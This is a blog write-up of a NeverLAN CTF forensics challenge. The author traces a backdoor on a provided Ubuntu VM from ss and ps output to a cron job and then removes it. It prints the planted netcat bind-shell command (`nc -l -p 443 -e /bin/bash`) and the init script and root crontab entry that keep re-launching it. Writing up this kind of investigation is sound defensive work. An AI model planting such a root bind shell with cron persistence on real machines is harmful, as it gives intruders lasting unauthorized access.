---
title: NeverLAN - Siths use Ubuntu (Part 1 of 3)
layout: post
date: '2018-02-27 11:51:00'
description: Writeup of Siths use Ubuntu (Part 1 of 3)
image: '/assets/images/logo.png'
tags:
- ctf
- writeup
author: Kauê Doretto
---

### Siths use Ubuntu (Part 1 of 3) (125)
>Author: bashninja
>Description: Ok... So the boss of your company has come to the security team with a problem. His "secure" linux box has been hacked. Password is: neverlan
>
>There are 3 things we need you to do. This is part 1.
>
>You've got to figure out how they keep getting in even though we've changed the password.
>
>[neverlan.ova](https://s3-us-west-2.amazonaws.com/neverlanctf/files/neverlan.ova){:target="_blank" rel="noopenner noreferrer"}


---

1.Download the "neverlan.ova" and open it in VirtualBox


2.Login in with the supplied password `neverlan`


3.If the password was changed and `they keep getting in` chances are there is a backdoor. If there's a backdoor, there's a process


4.Open the terminal and run `sudo ss -tlnp`
```
$ sudo ss -tlpn
State      Recv-Q Send-Q                                Local Address:Port                                               Peer Address:Port
LISTEN     0      5                                         127.0.1.1:53                                                            *:*                   users:(("dnsmasq",pid=1026,fd=5))
LISTEN     0      128                                               *:22                                                            *:*                   users:(("sshd",pid=27165,fd=3))
LISTEN     0      5                                         127.0.0.1:631                                                           *:*                   users:(("cupsd",pid=23100,fd=11))
LISTEN     0      1                                                 *:443                                                           *:*                   users:(("nc.traditional",pid=2187,fd=3))
LISTEN     0      128                                              :::22                                                           :::*                   users:(("sshd",pid=27165,fd=4))
LISTEN     0      5                                               ::1:631                                                          :::*                   users:(("cupsd",pid=23100,fd=10))
```

5.Port 443 is a well known port for HTTPS, but a process named `nc.traditional` (PID 2187) is listening there.


6.Let's check the process
```
kyloren@kyloren-ubuntu:~$ sudo ps -p 2187 -u 
USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND 
root 2187 0.0 0.0 6496 268 ? S 20:45 0:00 /bin/nc.traditional -l -p 443 -e /bin/bash
```


7.Next we check the parent process that spawned it
```
kyloren@kyloren-ubuntu:~$ sudo ps -l 2187
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY        TIME CMD
4 S     0  2187  2182  0  80   0 -  1624 inet_c ?          0:00 /bin/nc.traditional -l -p 443 -e /bin/bash

kyloren@kyloren-ubuntu:~$ sudo ps -p 2182 -u
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root      2182  0.0  0.0  19580   316 ?        S    20:45   0:00 /bin/bash /etc/init.d/rebels
```


8.And the file's contents
```
kyloren@kyloren-ubuntu:~$ cat /etc/init.d/rebels 
#!/bin/bash
# The F | L | A | G is: kylo_ren_undercover_boss
if (( `/bin/ps aux | /bin/grep /bin/nc | /usr/bin/wc -l` == 1 )); then /bin/nc.traditional -l -p 443 -e /bin/bash; fi
```


9.Now, I bet you don't want your boss to force-choke you because you said his computer was safe again. It is not. Let's keep going up the process tree
```
kyloren@kyloren-ubuntu:~$ sudo ps -l 2182
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY        TIME CMD
0 S     0  2182  2181  0  80   0 -  4895 wait   ?          0:00 /bin/bash /etc/init.d/rebels
kyloren@kyloren-ubuntu:~$ sudo ps -l 2181
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY        TIME CMD
4 S     0  2181  2180  0  80   0 -  1127 wait   ?          0:00 /bin/sh -c /etc/init.d/rebels
kyloren@kyloren-ubuntu:~$ sudo ps -l 2180
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY        TIME CMD
5 S     0  2180   846  0  80   0 - 14845 wait   ?          0:00 /usr/sbin/CRON -f
kyloren@kyloren-ubuntu:~$ sudo ps -l 846
F S   UID   PID  PPID  C PRI  NI ADDR SZ WCHAN  TTY        TIME CMD
4 S     0   846     1  0  80   0 -  9019 hrtime ?          0:00 /usr/sbin/cron -f
```


So, the backdoor is being spawned by a crontab task:
```
kyloren@kyloren-ubuntu:~$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/5 *   * * *	root	/etc/init.d/rebels
#
```


Remove the last task and ruin the good guys' day and the Star Wars IX movie.
